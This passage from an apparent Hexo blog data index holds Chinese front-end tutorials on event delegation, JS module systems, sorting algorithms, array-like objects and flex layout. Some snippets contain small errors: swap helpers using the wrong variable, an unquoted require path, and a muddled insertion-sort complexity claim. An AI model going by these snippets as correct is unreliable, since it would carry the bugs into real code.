一般来说，dom需要有事件处理程序，我们都会直接给它设事件处理程序就好了，若很多的dom需要添加事件处理，比如我们有100个li，每个li都有相同的click点击事件，可能我们会用for循环的方法，来遍历所有的li，然后给它们添加事件，那这么做会存在什么影响呢？ 在JavaScript中，添加到页面上的事件处理程序数量将直接关系到页面的整体运行性能，因为需要不断的与dom节点进行交互，访问dom的次数越多，引起浏览器重绘与重排的次数也就越多，就会延长整个页面的交互就绪时间（所以性能优化的主要思想之一就是减少DOM操作）；如果要用事件委托，就会将所有的操作放到js程序里面，与dom的操作就只需要交互一次，这样就能大大的减少与dom的交互次数，提高性能； 每个函数都是一个对象，是对象就会占用内存，对象越多，内存占用率就越大，自然性能就越差了，比如上面的100个li，就要占用100个内存空间，如果是1000个，10000个呢，那只能说呵呵了，如果用事件委托，那么我们就可以只对它的父级（如果只有一个父级）这一个对象进行操作，这样我们就需要一个内存空间就够了，自然性能就会更好。 3）原理： 事件委托是利用事件的冒泡原理来实现的，事件冒泡就是事件从最深的节点开始，逐步向上传播事件。 如：页面上有这么一个节点树，div&gt;ul&gt;li&gt;a，给最里面的a加一个click点击事件，那么这个事件就会一层一层的往外执行，执行顺序a&gt;li&gt;ul&gt;div，那么我们给最外面的div加点击事件，里面的ul，li，a做点击事件的时候，都会冒泡到最外层的div上，所以都会触发，这就是事件委托，委托它们父级代为执行事件。 二、实现事件代理 我们举例子来说： 对于下面，实现功能：点击li，弹出123： 123456&lt;ul id=\"ul1\"&gt; &lt;li&gt;111&lt;/li&gt; &lt;li&gt;222&lt;/li&gt; &lt;li&gt;333&lt;/li&gt; &lt;li&gt;444&lt;/li&gt;&lt;/ul&gt; 1）首先，实现功能：点击li，弹出123： a、一般： 12345678910111213window.onload = function()&#123; var oUl = document.getElementById(&quot;ul1&quot;); var aLi = oUl.getElementsByTagName(&apos;li&apos;); for(var i=0; i&lt;aLi.length; i++)&#123; aLi[i].onclick = function()&#123; alert(123); &#125; &#125;&#125;上面的代码，我们看看有多少次的dom操作，首先要找到ul、li，然后遍历li，然后点击li的时候，又要找一次目标的li的位置，才能执行最后的操作，每次点击都要找一次li； b、事件代理： 12345678910111213141516171819window.onload = function()&#123; var oUl = document.getElementById(\"ul1\"); oUl.onclick = function(ev)&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; if(target.nodeName.toLowerCase() == 'li')&#123; alert(123); alert(target.innerHTML); &#125; &#125;&#125;上面的代码，Event对象提供了一个属性叫target，可以返回事件的目标节点，我们成为事件源，也就是说，target就可以表示为当前的事件操作的dom，但不是真正操作dom。当然这个是有兼容性的，标准浏览器用ev.target，IE浏览器用event.srcElement，此时只是获取了当前节点的位置，并不知道是什么节点名称，这里我们用nodeName来获取具体是什么标签名，这个返回的是一个大写的，我们需要转成小写再做比较（习惯问题）这样点击li会触发事件，且每次只执行一次dom操作，如果li数量很多的话，将大大减少dom的操作，优化性能 2）再者，点击ul下面的li，弹出当前li的index a、一般： 123456789var nodes = document.getElementsByTagName(&quot;li&quot;);for(i = 0; i&lt;nodes.length; i+= 1)&#123; nodes[i].onclick = (function(i)&#123; return function() &#123; console.log(i); &#125; &#125;)(i); //立即执行函数,参数是i, 循环时已把i值赋给li的onclick事件, 外部函数的i改变后并不会影响i的值.&#125; b、事件代理： 1234567891011var oUl = document.getElementById(\"ul1\");var oLi = oUl.getElementsByTagName(\"li\"); oUl.onclick = function(ev)&#123; var ev = ev || window.event; var target = ev.target || ev.srcElement; for(var i = 0, len = oLi.length; i &lt; len; i++)&#123; if(oLi[i] == target)&#123; alert(i); &#125; &#125; &#125; 标注： 参考资料1：https://www.cnblogs.com/liugang-vip/p/5616484.html 参考资料2：https://segmentfault.com/q/1010000008557139?_ea=1680527","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"前端模块化开发","slug":"JS-bs-module","date":"2018-03-15T07:20:44.000Z","updated":"2018-07-03T16:40:50.777Z","comments":true,"path":"2018/03/15/JS-bs-module/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/15/JS-bs-module/","excerpt":"","text":"一、前言 模块化开发就是封装函数细节，提供使用接口，一个模块就是一个实现特定功能的文件，有了模块，在复杂项目时可以更好的分工和规范。模块化开发的基础就是函数。 本文主要介绍前端的模块化开发，包括ES6的module以及三个主要的模块化开发规范 CommonJS AMD 以及 CMD。 二、ES6 Module ES6 的模块功能主要通过 export 以及 import 实现。模块中如果对外暴露接口就需要使用 export ，而如果想在模块中引用外部模块就需要使用 import。如： 123456789//reactimport React from 'react';import &#123;func as fu, bar&#125; from './my_module';...export class MyClass extends React.Component &#123;&#125; 注意： 1）上例中不止可以导出一个类，只要想把模块中的变量、方法等等暴露出去，都可以使用 export。 2）import 中我们使用了大括号，其中大括号中的变量名必须和被导入模块中对外暴露的借口名称相同，其实就是一个解构操作。 3）import 的时候我们使用了 as 来区别名，将输入的 func 变量重新取名为 fu,这样做的好处是如果同时引入的两个模块中都含有 func 方法，通过区别名的方式就可以区分开来。其实在 export 的时候我们就可以使用别名。 4）import 具有提升效果，因为是在编译阶段执行的，在代码运行之前。因此也不能使用一些运行时才能知道的语法结果，比如在 if else 语句之中判断 import 哪个模块。 5）在导出的时候可以使用 export default,指定默认输出，此时就不需要再给自己的函数等取名字了，可以使用匿名函数。这样在 import 的时候可以自己随意取名字。(注意一个模块里面只能又一个 default) 比如： 1import $, &#123;clone&#125; from 'my_module'; 在 my_module 中的写法就是： 123456export default function() &#123; // 对应 import 中的 $ ...&#125;export function clone (obj) &#123; // 对应 import 中的 &#123;clone&#125; ...&#125; 三、CommonJS CommonJS就是为JS的表现来制定规范，主要是在 Node 服务器端的规范。 CommonJS 也认为一个文件就是一个模块，必须通过某种导出才能使得别的模块使用该模块的对外接口。在 CommonJS 中使用 module.exports 对象进行导出，并且一个模块中只有这一个统一的出口，在外部模块中使用 require 进行加载，这个方法读取一个文件并且返回文件中的 module.exports 对象。如： 12345678910111213141516171819//定义一个模块 my_modules：function bar() &#123; ...&#125;fucntion func() &#123; ....&#125;module.exports = &#123; bar: bar, func: func&#125;//加载模块：var needModules = require(./my_modules);needModules.bar();needModules.func(); 注意： 1）加载的文件如果是“／”开头表示记载绝对路径的模块，以“./”开头表示加载相对路径的模块文件，两者都不含的话表示从系统的核心模块或者 node_modules 已经安装的模块。 2）模块加载会有缓存，存放在 require.cache 之中，并且缓存是根据绝对路径是识别的，同样的模块名放在不同的路径之中多次 require 的时候还是不会重新加载模块，除非使用 delete require.cache。 3）CommonJS是同步加载的，因此更适合服务器端。只有加载完成之后才能进行下面的操作。因为在服务器端模块文件一般存放在本地，再加上有缓存，加载速度十分快。因此这种就不适合用在浏览器端，浏览器端的各个 script 标签中的文件来自各个服务器，如果上个模块记载的时间很长，就会导致浏览器“假死”，因此浏览器端我们采用另外一种异步的加载方式–AMD。 四、AMD AMD（Asynchronous Module Definition）就是异步加载模块，模块的加载不会影响后面代码的执行。所以依赖这个模块的代码都在一个回调函数中，等到所有模块加载完成之后就会执行这个回调函数。最常见的支持 AMD 规范的就是 RequireJS。 在 AMD 中，模块的加载也是使用 require([dependencies], function(){}) 语句，但是不同于 CommonJS,它的参数第一个是需要加载的模块文件，之后是需要约定一个回调函数，由这个回调函数去规定当模块都加载完成之后执行什么操作，加载的模块会以参数形式传入该回调函数函数，从而在回调函数内部就可以使用这些模块。 而模块的定义主要是使用 define(id?, dependencies, factory)语句，其中 id 可选，定义模块的标识。 dependencies 可选参数，表示当前模块依赖的模块，是一个数组。 factory 是一个工厂方法，表示模块初始化需要执行的函数或者对象。一般我们会在这个 factory 中 return 出一个对象来暴露出我们的对外接口等等。 如： 12345678910111213141516//定义一个模块 my_modulesdefine(['math'], function() &#123; function bar() &#123; ... &#125; return &#123; bar: bar &#125;;&#125;);//加载模块require([my_modules], function(my) &#123; my.bar();&#125;) 五、CMD CMD（Common Module Definition）就是通用模块定义。CMD 是从国内发展出去的，实现主要是 SeaJS, 和 AMD 都是解决异步加载以及模块依赖的问题，但是在模块的定义方式上面有点不同。 在 CMD 中，定义模块使用 define(id?, deps?,factory)。其中 id、depes 可以省略，字符串 id 表示模块标识，数组 deps 是模块依赖。当 factory 是一个函数的时候表示模块的构造方法，默认接受三个参数 require、export、module，require 是一个方法，接受模块标识作为唯一参数，用来获取其他模块提供的接口，exports 是一个对象，用来向外提供模块接口，module 是一个对象，上面存储了与当前模块相关联的一些属性和方法。 如： 123456789101112131415161718192021222324252627282930313233// 定义模块 myModule.jsdefine(function(require, export, module) &#123; var person = &#123;name: 'abby', age: 20&#125;; // 需要的时候才去加载模块 lodash var _ = require('lodash'); var shallow = _clone(person); // 支持异步加载模块,当多个模块加载完成之后才执行回调 require.async('./a', './b', function(a, b) &#123; a.doSomething(); b.doSomething(); &#125;); bar() &#123; ... &#125; // 在导出模块的时候支持了 CommonJS 和 AMD 的写法。 return &#123; bar: bar &#125;; // 或者 module.exports = &#123; bar: bar &#125; // 或者 exports.bar = bar //此时注意不能写成对象形式&#125;)// 加载模块seajs.use(['myModule.js'], function(my)&#123;&#125;); AMD CMD 区别: 1、AMD推崇依赖前置，在定义模块的时候就声明依赖的模块（依赖提前执行）。CMD 推崇依赖就近，只有在需要用的时候才去require 执行（依赖延迟执行）。 2、有人说，AMD用户体验好，因为没有延迟，依赖模块提前执行了，CMD性能好，因为只有用户需要的时候才执行的原因。 标注： 参考资料1：http://luckyabby.com/post/前端模块化开发/","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"排序算法总结","slug":"DS-bs-sort","date":"2018-03-14T12:14:58.000Z","updated":"2019-01-25T09:59:56.379Z","comments":true,"path":"2018/03/14/DS-bs-sort/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/14/DS-bs-sort/","excerpt":"","text":"一、排序性能 对于排序算法来说，其性能主要包括两个方面： 时间复杂度：指执行算法所需要的计算工作量；用O表示； 空间复杂度：指执行这个算法所需要的内存空间；用O表示； 关于排序的稳定性：通俗地讲，若排序前两个相等的数在序列的前后位置顺序，和排序后它们两个的前后位置顺序相同，那么就是稳定的。简单形式化一下，如果Ai = Aj，Ai原来在位置前，排序后Ai还是要在Aj位置前。 什么时候需要稳定：比如说按班级录入各班成绩，1、2、3班都有一个同分数的同学A、B、C，按成绩排序后，顺序应该是A、B、C，但如果算法不稳定，A、B、C的顺序可能会改变，这样既看起来别扭，可能有同学也会有意见。 二、Array.sort 1）描述：sort()方法用于对数组的元素进行排序,并返回数组。 2）语法：arrayObject.sort(sortby)。 3）注意： 默认排序顺序是根据字符串Unicode码点。参数sortby可选，规定排序顺序，必须是函数。即： a、如果调用该方法时没有使用参数，将按字母顺序对数组中的元素进行排序，即按照字符编码的顺序进行排序。 b、如果想按其他标准进行排序，需提供比较函数，该函数比较两个值，然后返回一个用于说明这两个值的相对顺序的数字。比较函数应该具有两个参数 a 和 b，其返回值如下： 若 a 小于 b，在排序后的数组中 a 应该出现在 b 之前，则返回一个小于 0 的值。 若 a 等于 b，则返回 0。 若 a 大于 b，则返回一个大于 0 的值。 12345const arr = [1, 20, 10, 30, 22, 11, 55, 24, 31, 88, 12, 100, 50];console.log(arr.sort()); //[ 1, 10, 100, 11, 12, 20, 22, 24, 30, 31, 50, 55, 88 ]console.log(arr.sort((item1, item2) =&gt; item1 - item2)); //[ 1, 10, 11, 12, 20, 22, 24, 30, 31, 50, 55, 88, 100 ] 4）性能： a、Array.sort是通过javascript来实现的，使用的算法主要是快速排序，从源码的角度来看在实现上明显比我们所使用的快速排序复杂多了，主要是做了性能上的优化。 三、冒泡排序 1）思路：第一次循环，开始比较当前元素与下一个元素的大小，如果比下一个元素小或者相等，则不需要交换两个元素的值；若比下一个元素大的话，则交换两个元素的值。然后，遍历整个数组，第一次遍历完之后，相同操作遍历第二遍。 2）图例： 3）实现： 1234567891011121314151617181920const arr = [1, 20, 10, 30, 22, 11, 55, 24, 31, 88, 12, 100, 50];function swap(array, p, q)&#123; let temp = array[p]; arr[p] = arr[q]; arr[q] = temp;&#125;function bubbleSort(arr)&#123; for(let i = 0; i &lt; arr.length - 1; i++)&#123; for(let j = 0; j &lt; arr.length - i - 1; j++)&#123; if(arr[j] &gt; arr[j + 1])&#123; swap(arr, j, j+1); &#125; &#125; &#125; return arr;&#125;console.log(bubbleSort(arr)); //[ 1, 10, 11, 12, 20, 22, 24, 30, 31, 50, 55, 88, 100 ] 4）性能： a、时间复杂度：平均时间复杂度是O(n^2)；最坏是O(n^2) – 把顺序的排列变成逆序，或把逆序的数列变成顺序；最好是O(N) – 数据本来就有序。 b、空间复杂度：由于辅助空间为常数，所以空间复杂度是O(1); 5）稳定性：稳定。因为排序时，如果两个元素相等，他俩前后位置顺序是不会交换的；除非你在排序时，交换两个元素的条件改成大于或等于。 6）改进：可以对冒泡排序进行改进，使得它的时间复杂度在大多数顺序的情况下，减小到O(n); a、加一个标志位，如果没有进行交换，将标志位置为false，表示排序完成。 1234567891011121314151617181920212223const arr = [1, 20, 10, 30, 22, 11, 55, 24, 31, 88, 12, 100, 50];function swap(array, p, q)&#123; let temp = array[p]; arr[p] = arr[q]; arr[q] = temp;&#125;for(let i = 0; i &lt; arr.length - 1; i++)&#123; let flag = false; for(let j = 0; j &lt; arr.length - 1 - i; j++)&#123; if(arr[j] &gt; arr[j+1])&#123; swap(arr, j, j+1); flag = true; &#125; &#125; if(!flag)&#123; break; &#125;&#125;console.log(arr); //[ 1, 10, 11, 12, 20, 22, 24, 30, 31, 50, 55, 88, 100 ] b、记录最后一次交换的位置， 因为最后一次交换的数，是在这一次排序当中最大的数，之后的数都比它小。在最佳状态时，时间复杂度也会缩小到O(n); 1234567891011121314151617181920212223const arr = [1, 20, 10, 30, 22, 11, 55, 24, 31, 88, 12, 100, 50 ,112];function swap(array, p, q)&#123; let temp = array[p]; arr[p] = arr[q]; arr[q] = temp;&#125;function improveBubble(arr, len)&#123; for(let i = len - 1; i &gt;= 0; i--)&#123; let pos = 0; for(let j = 0; j &lt; i; j++)&#123; if(arr[j] &gt; arr[j+1])&#123; swap(arr, j, j+1); pos = j + 1; &#125; &#125; len = pos + 1; &#125; return arr;&#125;console.log(improveBubble(arr, arr.length)); //[ 1, 10, 11, 12, 20, 22, 24, 30, 31, 50, 55, 88, 100, 112 ] 四、选择排序 1）思路： 第一遍，从数组中选出最小的，与第一个元素进行交换；第二遍，从第二个元素开始，找出最小的，与第二个元素进行交换；依次循环，完成排序 2）图例： 3）实现： 12345678910111213141516171819202122const arr = [1, 20, 10, 30, 22, 11, 55, 24, 31, 88, 12, 100, 50];function swap(arr, i, index)&#123; var temp = arr[i]; arr[i] = arr[index]; arr[index] = temp;&#125;function selectionSort(arr)&#123; for(let i = 0; i &lt; arr.length - 1; i++)&#123; let index = i; for(let j = i+1; j &lt; arr.length; j++)&#123; if(arr[index] &gt; arr[j])&#123; index = j; &#125; &#125; swap(arr, i, index); &#125; return arr;&#125;console.log(selectionSort(arr)); //[ 1, 10, 11, 12, 20, 22, 24, 30, 31, 50, 55, 88, 100 ] 4）性能： 时间复杂度：平均时间复杂度是O(n^2)。最好最坏也是（三项复杂度一样的即与初始排序无关）。 空间复杂度：辅助空间是常数，空间复杂度为O(1); 5）稳定性：不稳定。举个例子，序列5 8 5 2 9，第一遍选择是第1个元素5会和2交换，那么原序列中2个5的相对前后顺序就被破坏了，所以选择排序不是一个稳定的排序算法。 五、插入排序 1）思路： 首先，循环原数组，然后，将当前位置的元素，插入到之前已排序好的数组中，依次操作。 2）图例： 3）实现： 12345678910111213141516171819202122const arr = [1, 20, 10, 30, 22, 11, 55, 24, 0, 31, 88, 12, 100, 50 ,112];function insertSort(arr)&#123; for(let i = 0; i &lt; arr.length; i++)&#123; let temp = arr[i]; for(let j = 0; j &lt; i; j++)&#123; if(temp &lt; arr[j] &amp;&amp; j === 0)&#123; //splice() 方法向/从数组中添加/删除项目，然后返回被删除的项目。 arr.splice(i, 1); //删除数组下标为i开始的1个元素 arr.unshift(temp); //往数组第一项插入temp break; &#125;else if(temp &gt; arr[j] &amp;&amp; temp &lt; arr[j+1] &amp;&amp; j &lt; i - 1)&#123; arr.splice(i, 1); //删除数组下标为i开始的1个元素 arr.splice(j+1, 0, temp); //删除数组下标为j+1开始的0个元素，并往j+1后插入temp break; &#125; &#125; &#125; return arr;&#125;console.log(insertSort(arr)); //[ 0, 1, 10, 11, 12, 20, 22, 24, 30, 31, 50, 55, 88, 100, 112 ] 4）性能： 时间复杂度：平均时间复杂度是O(n^2)；最坏是O(n^2) – 把顺序的排列变成顺序，或把逆序的数列变成逆序；最好是O(N) – 把顺序的排列变成新逆序，或把逆序的数列变成顺序。 空间复杂度：辅助空间为常数，空间复杂度是O(1) 5）稳定性：稳定。如果碰见一个和插入元素相等的，那么会把插入元素放在相等元素的后面。所以相等元素的前后顺序没有改变，所以插入排序是稳定的。 上面三个算法都是难兄难弟，因为算法的时间复杂度都是在O(n^2)，在最坏情况下，它们都需要对整个数组进行重新调整。 六、快速排序 1）思路： 首先，我们需要找到一个基数，然后将比基数小的值放在基数的左边，将比基数大的值放在基数的右边，之后进行递归那两组已经归类好的数组。 2）图例： 3）实现： 1234567891011121314151617181920const arr = [30, 32, 6, 24, 37, 32, 45, 21, 38, 23, 47];function quickSort(arr)&#123; if(arr.length &lt;= 1)&#123; return arr; &#125; let temp = arr[0]; const left = []; const right = []; for(var i = 1; i &lt; arr.length; i++)&#123; if(arr[i] &gt; temp)&#123; right.push(arr[i]); &#125;else&#123; left.push(arr[i]); &#125; &#125; return quickSort(left).concat([temp], quickSort(right));&#125;console.log(quickSort(arr)); 4）性能： 时间复杂度：平均时间复杂度O(nlogn)，最好是O(nlogn) – 每次都能均匀的划分序列，最差是O(n^2) – 划分之后一边是一个，一边是n-1个。 空间复杂度：辅助空间是logn，所以空间复杂度为O(logn) 5）稳定性：不稳定。比如序列为5 3 3 4 3 8 9 10 11，现在中枢元素5和3（第5个元素，下标从1开始计）交换就会把元素3的稳定性打乱，所以快速排序是一个不稳定的排序算法，不稳定发生在中枢元素和a[j] 交换的时刻。 七、归并排序 1）思路： 首先，将相邻的两个数进行排序，形成n/2对，然后在每两对进行合并，不断重复，直至排序完。 2）图例： 3）实现： 1234567891011121314151617181920212223242526272829//迭代版本const arr = [3,44,38,5,47,15,36,26,27,2,46,4,19,50,48]function mergeSort(arr)&#123; const len = arr.length; for(let seg = 1; seg &lt; len; seg += seg)&#123; let arrB = []; for(let start = 0; start &lt; len; start += 2*seg)&#123; let row = start, mid = Math.min(start+seg, len), heig = Math.min(start + 2*seg, len); let start1 = start, end1 = mid; let start2 = mid, end2 = heig; while(start1 &lt; end1 &amp;&amp; start2 &lt; end2)&#123; arr[start1] &lt; arr[start2] ? arrB.push(arr[start1++]) : arrB.push(arr[start2++]); &#125; while(start1 &lt; end1)&#123; arrB.push(arr[start1++]); &#125; while(start2 &lt; end2)&#123; arrB.push(arr[start2++]); &#125; &#125; arr = arrB; &#125; return arr;&#125;console.log(mergeSort(arr)); 123456789101112131415161718192021222324252627//递归版const arr = [3,44,38,5,47,15,36,26,27,2,46,4,19,50,48];function mergeSort(arr, seg = 1)&#123; const len = arr.length; if(seg &gt; len)&#123; return arr; &#125; const arrB = []; for(var start = 0; start &lt; len; start += 2*seg)&#123; let low = start, mid = Math.min(start+seg, len), heig = Math.min(start+2*seg, len); let start1 = low, end1 = mid; let start2 = mid, end2 = heig; while(start1 &lt; end1 &amp;&amp; start2 &lt; end2)&#123; arr[start1] &lt; arr[start2] ? arrB.push(arr[start1++]) : arrB.push(arr[start2++]); &#125; while(start1 &lt; end1)&#123; arrB.push(arr[start1++]); &#125; while(start2 &lt; end2)&#123; arrB.push(arr[start2++]); &#125; &#125; return mergeSort(arrB, seg * 2);&#125;console.log(mergeSort(arr)); 4）性能： 时间复杂度：平均时间复杂度是O(nlogn)。最好最坏也是（三项复杂度一样的即与初始排序无关）。 空间复杂度：辅助空间为n，空间复杂度为O(n) 5）稳定性：稳定。合并过程中，如果两个当前元素相等时，我们把处在前面序列的元素保存在结果序列的前面。所以，归并排序也是稳定的排序算法。 八、基数排序 1）思路： 首先，比较个位的数字大小，将数组的顺序变成按个位依次递增的，之后再比较十位，再比较百位的，直至最后一位。 2）图例： 3）实现： 12345678910111213141516171819202122232425262728293031323334353637const arr = [3221, 1, 10, 9680, 577, 9420, 7, 5622, 4793, 2030, 3138, 82, 2599, 743, 4127, 10000];function radixSort(arr)&#123; let maxNum = Math.max(...arr); let dis = 0; const len = arr.length; const count = new Array(10); const tmp = new Array(len); while(maxNum &gt;=1)&#123; maxNum /= 10; dis++; &#125; for(let i = 1, radix = 1; i &lt;= dis; i++)&#123; for(let j = 0; j &lt; 10; j++)&#123; count[j] = 0; &#125; for(let j = 0; j &lt; len; j++)&#123; let k = parseInt(arr[j] / radix) % 10; count[k]++; &#125; for(let j = 1; j &lt; 10; j++)&#123; count[j] += count[j - 1]; &#125; for(let j = len - 1; j &gt;= 0 ; j--)&#123; let k = parseInt(arr[j] / radix) % 10; tmp[count[k] - 1] = arr[j]; count[k]--; &#125; for(let j = 0; j &lt; len; j++)&#123; arr[j] = tmp[j]; &#125; radix *= 10; &#125; return arr;&#125;console.log(radixSort(arr)); 4）性能： 时间复杂度：平均时间复杂度O(k*n)，k为最大位数的位数。最好最坏也是（三项复杂度一样的即与初始排序无关）。 空间复杂度：O(n) 5）稳定性：稳定。在基数排序过程中，每次都是将当前位数上相同数值的元素统一装桶，并不需要交换位置，所以基数排序是稳定的算法。 九、希尔排序十、堆排序标注： 参考资料1：https://github.com/laizimo/zimo-article/issues/9","categories":[{"name":"数据结构","slug":"数据结构","permalink":"http://liuxuewen-site.github.io/categories/数据结构/"}],"tags":[{"name":"数据结构","slug":"数据结构","permalink":"http://liuxuewen-site.github.io/tags/数据结构/"}]},{"title":"伪数组","slug":"JS-bs-pseudoArray","date":"2018-03-14T07:08:40.000Z","updated":"2019-01-25T10:11:49.911Z","comments":true,"path":"2018/03/14/JS-bs-pseudoArray/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/14/JS-bs-pseudoArray/","excerpt":"","text":"一、什么是伪数组 存在length属性，可以通过数组下标的方法对每个元素进行访问，但无法直接调用数组方法的对象即为伪数组，也叫类数组。 二、常见的伪数组 1、arguments对象 2、通过getElementByTagName、getElementByClassName等获取元素后返回的节点列表 三、arguments对象 1、定义：arguments是一个对应于传递给函数的参数的类数组对象。 2、描述： 1）arguments对象是所有（非箭头）函数中都可用的局部变量。可以使用arguments对象在函数中引用函数的参数，此对象包含传递给函数的每个参数的条目，第一个条目的索引从0开始。 1234567//例如，如果一个函数传递了三个参数，你可以以如下方式引用他们：arguments[0]arguments[1]arguments[2]//参数也可以被设置：arguments[1] = 'new value'; 2）arguments对象不是一个Array。它类似于Array（伪数组），但除了length属性和索引元素之外没有任何Array属性。例如它没有pop方法。但是它可以被转换为一个真正的Array。 12345678//将arguments转换为一个真正的Arrayvar args = Array.prototype.slice.call(arguments);//或var args = [].slice.call(arguments); //或const args = Array.from(arguments); // ES2015 3）使用arguments对象对于传递可变数量的参数的函数很有用，使用arguments.length来确定传递给函数参数的个数，然后使用arguments对象来处理每个参数。 3、属性： 1）arguments.callee：指向当前执行的函数。 2）arguments.caller：指向调用当前函数的函数。（已被移除） 3）arguments.length：指向传递给当前函数的参数数量。 4）arguments[@@iterator]：返回一个新的Array迭代器对象，该对象包含参数中每个索引的值。 4、例子： 1）遍历参数求和： 1234567891011function add() &#123; var sum =0, len = arguments.length; for(var i=0; i&lt;len; i++)&#123; sum += arguments[i]; &#125; return sum;&#125;add() // 0add(1) // 1add(1,2,3,4); // 10 2）定义连接字符串的函数： 123456789101112131415//该函数唯一正式声明了的参数是一个字符串，该参数指定一个字符作为衔接点来连接字符串。function myConcat(separator) &#123; var args = Array.prototype.slice.call(arguments, 1); return args.join(separator);&#125;//你可以传递任意数量的参数到该函数，并使用每个参数作为列表中的项创建列表。// returns \"red, orange, blue\"myConcat(\", \", \"red\", \"orange\", \"blue\");// returns \"elephant; giraffe; lion; cheetah\"myConcat(\"; \", \"elephant\", \"giraffe\", \"lion\", \"cheetah\");// returns \"sage. basil. oregano. pepper. parsley\"myConcat(\". \", \"sage\", \"basil\", \"oregano\", \"pepper\", \"parsley\"); 3）定义创建HTML列表的方法： 1234567891011121314//该函数唯一正式声明了的参数是一个字符，//当该参数为 \"u\" 时创建一个无序列表 (项目列表)，当该参数为 \"o\" 时创建一个有序列表 (编号列表)。function list(type) &#123; var result = \"&lt;\" + type + \"l&gt;&lt;li&gt;\"; var args = Array.prototype.slice.call(arguments, 1); result += args.join(\"&lt;/li&gt;&lt;li&gt;\"); result += \"&lt;/li&gt;&lt;/\" + type + \"l&gt;\"; // end list return result;&#125;//你可以传递任意数量的参数到该函数，并将每个参数作为一个项添加到指定类型的列表中。//returns \"&lt;ul&gt;&lt;li&gt;One&lt;/li&gt;&lt;li&gt;Two&lt;/li&gt;&lt;li&gt;Three&lt;/li&gt;&lt;/ul&gt;\"var listHTML = list(\"u\", \"One\", \"Two\", \"Three\"); 4）剩余参数、默认参数和解构赋值参数： 12345678910111213141516171819202122232425262728293031323334353637//arguments对象可以与剩余参数、默认参数和解构赋值参数结合使用。//剩余参数语法允许将一个不定数量的参数表示为一个数组。//默认参数语法允许在没有值或undefined被传入时使用默认形参。//解构赋值语法使得可以将值从数组或属性从对象提取到不同的变量中。在严格模式下，剩余参数、默认参数和解构赋值参数的存在不会改变 arguments对象的行为。在非严格模式中的函数没有包含剩余参数、默认参数和解构赋值时，arguments对象中的值会跟踪参数的值（反之亦然）。function func(a) &#123; arguments[0] = 99; // 更新了arguments[0] 同样更新了a console.log(a);&#125;func(10); // 99function func(a) &#123; a = 99; // 更新了a 同样更新了arguments[0] console.log(arguments[0]);&#125;func(10); // 99在非严格模式中的函数有包含剩余参数、默认参数和解构赋值时，arguments对象中的值不会跟踪参数的值（反之亦然）。function func(a = 55) &#123; arguments[0] = 99; // updating arguments[0] does not also update a console.log(a);&#125;func(10); // 10function func(a = 55) &#123; a = 99; // updating a does not also update arguments[0] console.log(arguments[0]);&#125;func(10); // 10function func(a = 55) &#123; console.log(arguments[0]);&#125;func(); // undefined 四、伪数组转数组的方法 1）声明一个空数组，通过遍历伪数组把它们重新添加到新的数组中 123456let arg = arguments;let arr = [];for (var i = 0; i &lt; arg.length; i++) &#123; arr.push(arg[i]);&#125;console.log(arr); 2）使用数组的slice()方法,它创建了新数组并返回的了新数组，使用call或者apply指向伪数组 1var arr = Array.prototype.slice.call(arguments); 3）使用ES6中数组的新方法 from(),将对象转为数组 123456function test()&#123; var arg = Array.from(arguments); arg.push(5); console.log(arg);&#125;test(1,2,3,4); //1,2,3,4,5 标注： 参考资料1：https://www.cnblogs.com/NTWang/p/6280447.html 参考资料2：https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Functions/arguments","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-JS","slug":"前端-JS","permalink":"http://liuxuewen-site.github.io/tags/前端-JS/"}]},{"title":"flex布局","slug":"CSS-ryf-flex","date":"2018-03-12T10:35:29.000Z","updated":"2019-01-25T09:59:22.149Z","comments":true,"path":"2018/03/12/CSS-ryf-flex/","link":"","permalink":"http://liuxuewen-site.github.io/2018/03/12/CSS-ryf-flex/","excerpt":"","text":"一、前言 布局的传统解决方案基于盒状模型，依赖 display + position + float，它对于特殊布局非常不方便，比如垂直居中等。 2009年，W3C提出了一种新的方案–Flex布局，可以简便、完整、响应式地实现各种页面布局。目前它已经得到了所有浏览器的支持。 二、Flex 布局 Flex 是 Flexible Box 的缩写，意为”弹性布局”，用来为盒状模型提供最大的灵活性。 采用 Flex 布局的元素，称为 Flex 容器（flex container），简称”容器”。它的所有子元素自动成为容器成员，称为 Flex 项目（flex item），简称”项目”。 任何一个容器都可以指定为 Flex 布局,如： 1234567891011121314151617//块级元素.box&#123; display: flex;&#125;//行内元素.box&#123; display: inline-flex;&#125;//Webkit 内核的浏览器，必须加上-webkit前缀.box&#123; display: -webkit-flex; /* Safari */ display: flex;&#125;注意，设为 Flex 布局以后，子元素的float、clear和vertical-align属性将失效。 三、基本原理 容器默认存在两根轴：水平的主轴（main axis）和垂直的交叉轴（cross axis）。 主轴的开始位置（与边框的交叉点）叫做main start，结束位置叫做main end； 交叉轴的开始位置叫做cross start，结束位置叫做cross end。 项目默认沿主轴排列。单个项目占据的主轴空间叫做main size，占据的交叉轴空间叫做cross size。 容器中所有的孩子的布局都会受到这两个轴的影响，相关的css属性就是通过改变主轴和纵轴的方向来实现不同的布局效果的。 四、容器的属性 以下6个属性设置在容器上：flex-direction、flex-wrap、flex-flow、justify-content、align-items、align-content 1、flex-direction属性： flex-direction属性决定主轴的方向（即项目的排列方向）。 它可取4个值： 1）row（默认值）：主轴为水平方向，起点在左端。 2）row-reverse：主轴为水平方向，起点在右端。 3）column：主轴为垂直方向，起点在上沿。 4）column-reverse：主轴为垂直方向，起点在下沿。 2、flex-wrap属性： 默认情况下，项目都排在一条线（又称”轴线”）上。flex-wrap属性定义，如果一条轴线排不下，如何换行。 它可能取三个值: 1）nowrap（默认）：不换行。 2）wrap：换行，第一行在上方。 3）wrap-reverse：换行，第一行在下方。 3、flex-flow属性： flex-flow属性是flex-direction属性和flex-wrap属性的简写形式，默认值为row nowrap。 4、justify-content属性： 